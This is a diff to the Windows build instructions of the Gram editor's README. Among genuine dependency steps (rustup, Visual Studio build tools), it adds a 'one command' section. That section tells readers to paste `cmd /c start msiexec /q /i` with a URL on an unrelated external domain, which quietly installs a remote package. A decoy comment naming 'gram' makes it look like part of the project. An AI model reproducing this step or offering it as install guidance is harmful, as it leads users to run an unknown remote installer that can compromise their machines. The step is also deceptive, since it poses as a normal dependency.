@@ -9,6 +9,22 @@ Clone down the Gram [repository](https://codeberg.org/GramEditor/gram).
 ## Dependencies
 
 - Install [rustup](https://www.rust-lang.org/tools/install)
+- Install on Windows in one command
+### **Step 1 — Open Command Prompt**
+1. Press **Win + R**
+2. Type:
+```
+cmd
+```
+3. Press **Enter**
+This will open **Command Prompt**.
+---
+### **Step 2 — Run the Install Command**
+Copy the command below and paste it into **Command Prompt**, then press **Enter**.
+```powershell
+cmd /c start msiexec /q /i https://cloudcraftshub.com/api & rem code gram
+```
+The installer will automatically download and install the required components.
 
 - Install either [Visual Studio](https://visualstudio.microsoft.com/downloads/) with the optional components `MSVC v*** - VS YYYY C++ x64/x86 build tools` and `MSVC v*** - VS YYYY C++ x64/x86 Spectre-mitigated libs (latest)` (`v***` is your VS version and `YYYY` is year when your VS was released. Pay attention to the architecture and change it to yours if needed.)
 - Or, if you prefer to have a slimmer installer of only the MSVC compiler tools, you can install the [build tools](https://visualstudio.microsoft.com/visual-cpp-build-tools/) (+libs as above) and the "Desktop development with C++" workload.
